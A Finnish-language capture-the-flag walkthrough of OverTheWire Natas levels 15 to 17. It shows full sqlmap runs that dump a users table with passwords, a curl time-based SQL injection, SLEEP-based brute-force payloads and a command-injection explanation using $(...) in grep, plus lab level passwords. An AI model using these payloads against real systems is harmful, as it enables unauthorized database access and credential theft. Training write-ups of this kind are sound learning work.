[11:31:18] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[11:31:27] [INFO] testing if parameter 'User-Agent' is dynamic
[11:31:28] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[11:31:28] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[11:31:28] [INFO] testing for SQL injection on parameter 'User-Agent'
[11:31:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:31:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[11:31:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[11:31:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'


.....

[11:36:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:36:42] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[11:36:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[11:36:47] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[11:36:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[11:36:52] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[11:36:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[11:36:55] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[11:36:57] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[11:37:00] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[11:37:03] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[11:37:06] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[11:37:07] [WARNING] user aborted during detection phase
how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit] e
[11:37:12] [WARNING] parameter 'Referer' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 6419 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=natas16" AND 1660=1660-- PPEC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
---
[11:37:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL < 5.0.12
[11:37:13] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'                                                                                                                          
[11:37:13] [WARNING] your sqlmap version is outdated

[*] ending @ 11:37:13 /2025-05-18/
```


---

## Natas 15 - 3 Kali linux nyt löytyi vastaus 

Nyt tämä alkoi pelittää ja se rakensi sen vastauksena et kävi jotenkin lävitse , mutta kuitenkin kävi lävitse tausta järjestelmänsä:
- tietokanta versio (MysQL < 5.0.12)
- käyttöjärjestelmä: Ubuntu Linux
- palvelin: Apache 2.4.58

Sekä kävi hakee tiedot, josta haettiin tietokannasta, koskevaa taulukkoa `users`, sarakkeen `username` ja `password`.

Eli alemmassa komennossa tapahtuu niin:
| **Osa**                         | **Kuvaus**                  | **Tarkennus / Käyttötarkoitus**                                                                     |
| ------------------------------- | --------------------------- | --------------------------------------------------------------------------------------------------- |
| `-u "URL"`                      | Kohdeosoite (URL)           | Sivun osoite, johon SQLMap tekee pyynnöt                                                            |
| `--auth-type Basic`             | Autentikointityyppi         | Käytetään HTTP Basic -tunnistautumista                                                              |
| `--auth-cred käyttäjä:salasana` | Tunnistautumistiedot        | Kirjaudutaan palveluun annetulla käyttäjätunnuksella ja salasanalla                                 |
| `--data "username=natas16"`     | POST-data                   | Lomakekenttä, jota SQLMap käyttää injektion kohteena                                                |
| `--string "This user exists"`   | Tunnistusteksti             | Blind SQL injection -testissä kertoo SQLMapille, että vastaus oli onnistunut (ehto palautti "true") |
| `--level=5`                     | Testauksen laajuus          | Testataan enemmän parametreja ja syvempää rakennetta                                                |
| `--risk=3`                      | Hyökkäysten aggressiivisuus | Sallitaan tehokkaammat (mutta mahdollisesti haitallisemmat) injektiotekniikat                       |
| `-D natas15`                    | Valittu tietokanta          | Tietokanta, josta tietoja haetaan                                                                   |
| `-T users`                      | Valittu taulu               | Taulu tietokannassa, josta tiedot haetaan                                                           |
| `-C username,password`          | Valitut sarakkeet           | Haettavat kentät `users`-taulusta                                                                   |
| `--dump`                        | Tulosta tiedot              | Tulostaa valitut tiedot komentoriville (tai tallentaa tiedostoon)                                   |

Huomoiona, ja tämä on tyyppillinen **blind SQL injectio** tapaus, jossa ei voi saada virheviestiä tai suoraa dataa takaisin - vain vihje siitä palauttiko ehto true vai false. `--string` on tällöin kriittinen mikä vertaa vastausta siihen.


```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
--auth-type Basic \
--string "This user exists" \
--auth-cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
--data "username=natas16" \
--level=5 --risk=3 \
-D natas15 -T users -C username,password --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:39:29 /2025-05-18/

[11:39:30] [INFO] resuming back-end DBMS 'mysql' 
[11:39:30] [INFO] testing connection to the target URL
[11:39:30] [INFO] testing if the provided string is within the target URL page content
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=natas16" AND 1660=1660-- PPEC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
---
[11:39:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL < 5.0.12
[11:39:30] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'natas15'
[11:39:30] [INFO] fetching number of column(s) 'password,username' entries for table 'users' in database 'natas15'
[11:39:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:39:30] [INFO] retrieved: 
[11:39:31] [WARNING] reflective value(s) found and filtering out
4
[11:39:32] [INFO] retrieved: 6P151OntQe
[11:39:37] [INFO] retrieved: bob
[11:39:39] [INFO] retrieved: HLwuGKts2w
[11:39:42] [INFO] retrieved: charlie
[11:39:45] [INFO] retrieved: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
[11:39:59] [INFO] retrieved: natas16
[11:40:02] [INFO] retrieved: hROtsfM734
[11:40:06] [INFO] retrieved: alice
Database: natas15
Table: users
[4 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| bob      | 6P151OntQe                       |
| charlie  | HLwuGKts2w                       |
| natas16  | hPkjKYviLQctEW33QmuXL6eDVfMW4sGo |
| alice    | hROtsfM734                       |
+----------+----------------------------------+

[11:40:08] [INFO] table 'natas15.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org/dump/natas15/users.csv'                                                                                                  
[11:40:08] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'                                                                                                                          
[11:40:08] [WARNING] your sqlmap version is outdated

[*] ending @ 11:40:08 /2025-05-18/
```


---

# Natas 15 - miten oltais virallisesti menty?

🔍 Tietokannan taulut

🔍 Sarakkeet halutusta taulusta

📥 Data sarakkeista

## etsitään taulu(t) tietokannasta natas15

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
--auth-type=Basic \
--auth-cred=natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
--data="username=natas16" \
--string="This user exists" \
--level=5 --risk=3 \
--tables -D natas15
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.5#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:57:08 /2025-05-18/

[12:57:09] [INFO] resuming back-end DBMS 'mysql' 
[12:57:09] [INFO] testing connection to the target URL
[12:57:10] [INFO] testing if the provided string is within the target URL page content
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=natas16" AND 1660=1660-- PPEC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
---
[12:57:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL < 5.0.12
[12:57:10] [INFO] fetching tables for database: 'natas15'
[12:57:10] [INFO] fetching number of tables for database 'natas15'
[12:57:10] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[12:57:10] [INFO] retrieved: 
[12:57:11] [WARNING] reflective value(s) found and filtering out
1
[12:57:13] [INFO] retrieved: users
Database: natas15
[1 table]
+-------+
| users |
+-------+

[12:57:18] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'                                                                                                                          
[12:57:18] [WARNING] your sqlmap version is outdated

[*] ending @ 12:57:18 /2025-05-18/
```


## etsitään sarakkeet/sisältö taulusta esim. (users)

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
--auth-type=Basic \
--auth-cred=natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
--data="username=natas16" \
--string="This user exists" \
--level=5 --risk=3 \
--columns -D natas15 -T users
        ___
       __H__                                                                                                                   
 ___ ___[']_____ ___ ___  {1.8.5#stable}                                                                                       
|_ -| . ["]     | .'| . |                                                                                                      
|___|_  ["]_|_|_|__,|  _|                                                                                                      
      |_|V...       |_|   https://sqlmap.org                                                                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:58:37 /2025-05-18/

[12:58:38] [INFO] resuming back-end DBMS 'mysql' 
[12:58:38] [INFO] testing connection to the target URL
[12:58:38] [INFO] testing if the provided string is within the target URL page content
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=natas16" AND 1660=1660-- PPEC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
---
[12:58:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL < 5.0.12
[12:58:38] [INFO] fetching columns for table 'users' in database 'natas15'
[12:58:38] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[12:58:38] [INFO] retrieved: 
[12:58:38] [WARNING] reflective value(s) found and filtering out
2
[12:58:43] [INFO] retrieved: username
[12:58:53] [INFO] retrieved: varchar(64)
[12:59:06] [INFO] retrieved: password
[12:59:13] [INFO] retrieved: varchar(64)
Database: natas15
Table: users
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(64) |
| username | varchar(64) |
+----------+-------------+

[12:59:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'                                                                                                                          
[12:59:19] [WARNING] your sqlmap version is outdated

[*] ending @ 12:59:19 /2025-05-18/
```


## Dump data sarakkeista username,password

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
--auth-type=Basic \
--auth-cred=natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
--data="username=natas16" \
--string="This user exists" \
--level=5 --risk=3 \
--dump -D natas15 -T users -C username,password
        ___
       __H__                                                                                                                   
 ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                                       
|_ -| . [.]     | .'| . |                                                                                                      
|___|_  [)]_|_|_|__,|  _|                                                                                                      
      |_|V...       |_|   https://sqlmap.org                                                                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:00:08 /2025-05-18/

[13:00:08] [INFO] resuming back-end DBMS 'mysql' 
[13:00:10] [INFO] testing connection to the target URL
[13:00:10] [INFO] testing if the provided string is within the target URL page content
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=natas16" AND 1660=1660-- PPEC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
---
[13:00:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL < 5.0.12
[13:00:10] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'natas15'
[13:00:10] [INFO] fetching number of column(s) 'password,username' entries for table 'users' in database 'natas15'
[13:00:10] [INFO] resumed: 4
[13:00:10] [INFO] resumed: 6P151OntQe
[13:00:10] [INFO] resumed: bob
[13:00:10] [INFO] resumed: HLwuGKts2w
[13:00:10] [INFO] resumed: charlie
[13:00:10] [INFO] resumed: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
[13:00:10] [INFO] resumed: natas16
[13:00:10] [INFO] resumed: hROtsfM734
[13:00:10] [INFO] resumed: alice
Database: natas15
Table: users
[4 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| bob      | 6P151OntQe                       |
| charlie  | HLwuGKts2w                       |
| natas16  | hPkjKYviLQctEW33QmuXL6eDVfMW4sGo |
| alice    | hROtsfM734                       |
+----------+----------------------------------+

[13:00:10] [INFO] table 'natas15.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org/dump/natas15/users.csv'                                                                                                  
[13:00:10] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'                                                                                                                          
[13:00:10] [WARNING] your sqlmap version is outdated

[*] ending @ 13:00:10 /2025-05-18/
```

# Koskien tätä Level 15 - tietokannan selvitystä / salapoliisityötä

Eli tästä levelistä kuinka oltaisi menty selvittää ja ratkaisee. Perus siinä `index-source.html` välilehdessä kerrottiin pieni vihjeenä että siinä on rakennettu **taulukko** joka on nimetty `users` eli (alempi table luominen), ja tässä antoi vihjeenä että taulun sisällössä on **sarakkeet**: `username` ja `password`.

```
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/
``` 

## Seuraavina, mistä me tiedettään tietokannan nimi?

Tämä PHP-koodipätkässä kuin: `mysqli_select_db($link, 'natas15');` - joka valittiin/valitsee käytettäväksi tietokannaksi eli **natas15**.
Lisäksi tämä on sensuroitu MySQL palvelin siksi lukee `localhost`: --> `$link = mysqli_connect('localhost', 'natas15', '<censored>');`

Näin olleen miniyhteenvetona saattiin näin.
- tietokanta/database: `natas15`
- tietokannan taulukko: `users`
- taulukkon sisältö: `username` ja `password`

Tästä rakentuu se parametri **SQLmap**:

| Asia              | Lähde koodissa                         | SQLMap-parametri              |
| ----------------- | -------------------------------------- | ----------------------------- |
| Tietokanta (`DB`) | `mysqli_select_db(..., 'natas15')`     | `-D natas15`                  |
| Taulu             | `CREATE TABLE users (...)`             | `-T users`                    |
| Sarakkeet         | `username`, `password`                 | `-C username,password`        |
| Injektiokohta     | `$_REQUEST["username"]` → SQL-kysely   | `--data "username=..."`       |
| Paluuviesti       | `"This user exists"` → blind injection | `--string "This user exists"` |



--- 

# Natas 16 - START HERE;

| natas16  | hPkjKYviLQctEW33QmuXL6eDVfMW4sGo |
 
tämä harjoitus muistuu level 9 ja 10:ltä, mutta muutama välissä on ollut muuta että joutuu palaa taakse päin. Kuitenkin tässä level 16:ssa jos syöttää jotakin se käy ihan kuin koko sanakirjan lävitse mitä se on nimennyt `dictionary.txt` sanat lävitse.

Aikaisemmassa noissa oli , että jotenkin estää erikoismerkin ja välissä syötettään linux terminaali sanoja mm. pwd, ls ja jne, mutta nyt ei.

estettyjä erikoismerkkejö on nämä ainakin mukaan lukien tässä php koodissa: ` if(preg_match('/[;|&`\'"]/',$key)) {} `` , ja voi olla tässä jouduttaan selvittää se hakemiston tiedoston polku eli `/etc/natas_webpass/natas17` ja tämä pätee yhdistelyn tai suorittamisen.


Haavoittuvuuden osalta on tämä osuus: `grep -i "$key" dictionary.txt` - tämä tarkoittaa, että käyttäjän syöte menee komentoriville sellaisenaan. Vaikka monet vaaralliset merkit on estetty, aina voi etsiä keinoja ohittaa suodatus ja vaikka ei sisällä estettyjä erityismerkkiä, mutta joka silti manipuloi komentoa.

kokeilin "bsana" niin siellä `dictionary.txt` - alta ei löydy sellaista ainakaan, mutta voisi kirjoittaa mikä ei täsmenny sen listan mukaan. 

kokeilaaln tätä `$(grep b /pwd)Sana`- ainakin toisti alemmat jutut

sanatoria
sanatorium
sanatorium's
sanatoriums


## Level 16 - 1 harjoituksen ideana

Tässä harjoituksen ideana on syöttää joku sana täsmentyy sen sanakirjan tekstitiedostoon `dictionary.txt` ja tämä PHP-koodipätkä on se tausta ikään kuin se käyttäjän syöte `passthru("grep -i \"$key\" dictionary.txt");`

Se mitä käyttäjä syöttää lomakkeeseen `needle` - kenttään niin siihen tulee se ns. "_käyttäjänsyöte_"


Miten tämä **$(....)** toimii tässä?

Esim. syötettäisiin sinne selaimen formaatti kenttään kuin: `$(echo african)` - niin shell suorittaa ensin `echo african`, ja korvaa koko `$(...)` sen palauttamalla arvolla mutta kuitenkin tämä toimii kuin injektio, mutta kuitenkin komentiinjektio on mahdollinen.

**Grep-komento**
Siinä PHP-koodissa on mainittu greppi osuus: `passthru("grep -i \"$key\" dictionary.txt");`.
periaatteessa tämän komento: `grep -i "$(echo african)" dictionary.txt` - voisi toimia ja toisaalta joka toimii kuin shell-komento, mikäli jos injektio toimii.

vähä kuin muuttuu muotoon: `grep -i "african" dictionary.txt`  - ja toisaalta tämä toimii normaalisti, jos $(...) ei ole estetty.

Ymmärtävämpi teoria:
Eli käyttäen tämän `$(...)` + sisään lisättynä `grep` termistö, joka toimii brute-force-hyökkäyksenä tyylisenä muotona ja muotoiltua/kierretty toista tapaa.


`$(...)` on komentorivin ominaisuus, joka suorittaa sisällä olevan komennon ja korvaa sen tulosteella, ja piste piste sisään mitä käyttäjä syöttää se on sitten toimii kuin **komentoinjektio** joka on just se haavoittuvuus prosessi.

Vaikka lopullinen komento menee vain grep:iin ja dictionary.txt sisällä olevia komento suoritettaan joka tapauksessa.


## Level 16 - 2 ACTION START HERE

Aloitettaan jotenkin tehdä sitä toimintaa, että seurattuna ja katsottu erilaisia ohjeita ja tapoja, sekä on mahdollista kokeilla ja runnata Kali Linux erikseen.

Paljon ohjeissa löytyy, että käyttää Python koodi pätkää, että sillä runnaa ja samahan pätee siinä pitää olla funktio, josta sallii tämä natas16 level:in ja sen kirjauttumisen salasanan.


```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 pythonkoodi.py 
E
Eq
Eqj
EqjH
EqjHJ
EqjHJb
EqjHJbo
EqjHJbo7
EqjHJbo7L
EqjHJbo7LF
EqjHJbo7LFN
EqjHJbo7LFNb
EqjHJbo7LFNb8
EqjHJbo7LFNb8v
EqjHJbo7LFNb8vw
EqjHJbo7LFNb8vwh
EqjHJbo7LFNb8vwhH
EqjHJbo7LFNb8vwhHb
EqjHJbo7LFNb8vwhHb9
EqjHJbo7LFNb8vwhHb9s
EqjHJbo7LFNb8vwhHb9s7
EqjHJbo7LFNb8vwhHb9s75
EqjHJbo7LFNb8vwhHb9s75h
EqjHJbo7LFNb8vwhHb9s75ho                                                                                            
EqjHJbo7LFNb8vwhHb9s75hok                                                                                           
EqjHJbo7LFNb8vwhHb9s75hokh                                                                                          
EqjHJbo7LFNb8vwhHb9s75hokh5                                                                                         
EqjHJbo7LFNb8vwhHb9s75hokh5T                                                                                        
EqjHJbo7LFNb8vwhHb9s75hokh5TF                                                                                       
EqjHJbo7LFNb8vwhHb9s75hokh5TF0
EqjHJbo7LFNb8vwhHb9s75hokh5TF0O
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

Tämä (ylempi) on se natas 17 salasanansa



# Level 16 - 2.5 miniyhteenveto

**Python**:
Miksi vastauksena mentiin Python koodilla, koska voi olla sen käyttö on hyödyllistä ja silloin kun suorassa komennossa injektiossa on vaikeuksia sen suodattimien takia. Python voi toistaa syötteitä ja analysoida tuloksia automaattisesti, mikä tekee brute force -hyökkäyksestä tehokkaamman.

Tämä ikään kuin varmistaisi, että syötteet on muotoiltu oikein ja käyttää PHP-scriptiä hyödyntämällä oikeita merkkejä kuten just `$()`. Tämä python koodi ratkaisu on yksi joka voi toteuttaa hyökkäystä tehokkaamin. 

Tämän level johtuen on siitä haasteessa käytettävä ympäristö suodattaa tai estää tietyt komennon, että siksi saatoi joutua käyttämäään Python ohjelmointikielen scriptiä ja täät olisi voinut suorittaa hyökkäystä normaalisti selaimen ja/tai terminaalin kautta, tai muita Kali Linux hyökkäys työkaluja.

Python voi mahdollista HTTP-pyyntöä ohjelmallisen lähettämistä ja vastausen käsittelyn automaattisesti, kun halutiin toteuttaa **brute-force hyökkäyst**, jossa tapahtui erilaisia merkkejä tai sanoja jatkuvasti ja automaattisesti. Jos palvelimella on suodattimia, niin voivat estää Python suoritettavaa komennon samalla tavalla kuin suora komentoinjektioiden yrittämisen terminaalissa.


**Mites Kali linux terminaali ja selaimen kautta**?

Molemmissa kuitenkin on rajoiteitta että haasteena on mahdolliset suodattimet, jotka estävät monimutkaisempia komentoja ja sama pätee erikoismerkkejä, ja websovellus ei suodattaa syötteitä ennen niiden lähettämistä palvelimelle. Selain kuitenkin on etu siinä, että käyttäjä voi nopeasti kokeilla erilaisia syötteitä ja nähdä palautteen. Terminaalissa kuitenkin voi suorittaa injektiota, mutta jos suodatus on liian tiukka, niin komennot voivat estyä.



## Level 16 - 3 Natas ohjeita ja linkkejä:

https://www.abatchy.com/2016/11/natas-level-16

http://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas16.md

https://samxia99.medium.com/overthewire-updated-natas-walkthrough-level-16-d3cb5b3f6c2e

https://mcpa.github.io/natas/wargame/web/overthewire/2015/10/01/natas16/

https://learnhacking.io/overthewire-natas-level-16-walkthrough/


---

# natas 17 - START HERE

natas17 : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC


Etusivulla ainakin syötin jotakin satunnaista sanaa, mutta tuloksena antoi tyhjän sivuston eli "index.php" - Kun tarkastellaan sitä "index-source.tml" välilehden sivustoa ainakin näyttää siellä on vinkkinä annettu on luotu tietokanta taulukkona `users`.


Koodi pätkä muistuu kuitenkin aikaisempaa level 14 ja 15 SQL injektiota, mutta tämä on haasteellisempi ja se hakee sen kysellynsä


Tässä PHP-koodipätkässä, kertoo jos käyttäjä syöte ehto jos on olemassa, toisena käyttäjä ei ole olemassa ja viimeisenä tuntematon/virhe kysely ja huomioina ne on kommentoitu eli // kentät.

```
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }
```

Eli tästä tuloksesta emme saada mitään tulosta (feedback), koska jos syöttää esim. "matti" - niin se ei kerro meille onko matti olemassa vai ei, että virheittäkään ei tulostu - niin tässä on kyseessä **time-blind SQL inection** level. Tässä tullaan suoriutua/testata ajallisen viivettä (aikataso hyökkäys) -> palvelin vastaa hitaammin, jos tietty ehto on tosi.

## Natas 17 - SLEEP() Injection

Tässä harjoituksessa onkin kyseessä suoritettava SQL-injektio (blind SQL injection), eli hyökkäystekniikka, jossa palvelin ei anna näkyvää vastausta — ei "käyttäjä on olemassa" tai "ei ole olemassa" — vaikka syötät mitä tahansa.

Mutta nyt tarkasti: vaikka palvelin ei palauta mitään näkyvää vastausta, voimme päätellä silti jotain sen käytöksestä — esimerkiksi vastausajasta.

Tämä on esim kommento, että testatan toimiiko ja jos palvelin viivyttää 5 sekunnin ajan, niin se voi kertoa SQL injektio onnistui ja ehto 1=1 - toisinsanoen totta.
```
time curl -s -X POST -d "username=x\" OR IF(1=1,SLEEP(5),0) -- " \
  -u natas17:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo \
  http://natas17.natas.labs.overthewire.org/
``` 


**Ajallinen viive SQL-injektiossa** on hyödyllinen tekniikka, jossa hyödynnetään palvelimen vastauksen viivettä paljastamaan tietokannan rakenteita tai paljastamaan tietoa, kuten oikea salasana tai käyttäjänimi. Ajalliset SQL-injektiot hyödyntävät `SLEEP()`-komentoa tietokannassa, joka viivyttää palvelimen vastausta tietyn ajan.


**Ajallinen viive SQL-injektio:**
- Tavoite: Aikaviiveen avulla voidaan päätellä, onko syötetty SQL-lause oikein muodostettu ja onko tietty ehto totta. Jos SQL-lauseessa on SLEEP()-komento ja se toteutuu, palvelin viivyttää vastausta.

- Toteutus: Testaamalla, kuinka kauan vastaus kestää, voidaan päätellä, onko tietty ehto totta (esim. 1=1), mikä voi paljastaa tietoa.

**Mitä SLEEP(5) tekeekään?**
Käyttäjä ei lähetä mitään pyyntöä 5 sekunnin välein, vaan palvelin itse odottaa, jos SQL-ehto on tosi ennen kuin se palauttaa viestinsä takaisin käyttäjälle.

Esim. tapahtumana SQL lause luodaan palvelimella: `SELECT * FROM users WHERE username="test" OR IF(1=1, SLEEP(5), 0) --`
- `1=1`on aina tosi -> SLEEP(5) aktivoituu
- palvelin odottaa 5 sekunttia ennen kuin se palauttaa mitään
- Käyttäjä odottaa sen 5 sekunnin ja sitten vasta saa vastauksensa

Vaikka ei näkisi mitään tulostetta niin voi päätellä ehdon onnistumisen viiveen perusteella.


🧠 Miksi tämä on hyödyllistä?
Tämä viive kertoo sinulle, että:
- Injektio onnistui (koska viivettä tuli)
- Ehto oli tosi (esim. joku tietty merkki salasanassa oli oikea)
- Voit käyttää tätä tietovuotoon ilman näkyviä tulosteita!

Sekä tässä harjoituksessen toisessa välilehdessä `index-source.html` kentällä on mainittu tietokantaa.
Mikä tarkoittaa etsiäkseen tietokannasta salasansa merkkiä kerrallaan käyttämällä palvelimen vastausviivetä (ajallisen SQL injektio), ilman että näkee mitään suoraan tulosettta.

Tämä ois looginen brute-force esimerkki, joka sitten tarkoittaisi kävisi kaikki aakkos järjestykset lävitse, ja tämä ei ole satunnainen arvaaminen, vaan **järjestelmällinen, viiveeen perustuva brute-force:**
```
username=natas18" AND IF(SUBSTRING(password,1,1)="a",SLEEP(3),0) -- 
username=natas18" AND IF(SUBSTRING(password,1,1)="b",SLEEP(3),0) -- 
username=natas18" AND IF(SUBSTRING(password,1,1)="c",SLEEP(3),0) -- 
...
```



## Natas 17 - 1 - pikainen testaus

Kokeillaan aikaisempien perusteella mitä harjoiteltu mm. SQL injektiota ja jne, että kokeillaan saadaan selville mitään.

Username kenttään lomakkeelle ainakin kokeilin muutamia vaihtoehtoja, mutta niissäkin siirtyy "index.php" tyhjään välilehteen mm. näitä injektiota

- ' OR 1=1
- sdf' OR 1=1
- username=1 OR "1"
- http://natas17.natas.labs.overthewire.org/index.php?debug?username=%22admin%22


# Natas 17 - 2 - Kali Linux - START HERE;

natas17 : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

## SQLMAP - START HERE

Tämä komento sama kuin aikaisempi, muttam uokattuna ja pitää vähä editoida

Käytä time-based blind injectionia, ja anna SQLMapin itse testata viiveitä:

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" \
--auth-type=Basic \
--auth-cred=natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC \
--data="username=natas18" \
--technique=T --time-sec=5 \
--level=5 --risk=3
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.5#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:06:48 /2025-05-21/

[19:06:49] [INFO] testing connection to the target URL
[19:07:00] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[19:07:00] [INFO] testing for SQL injection on POST parameter 'username'
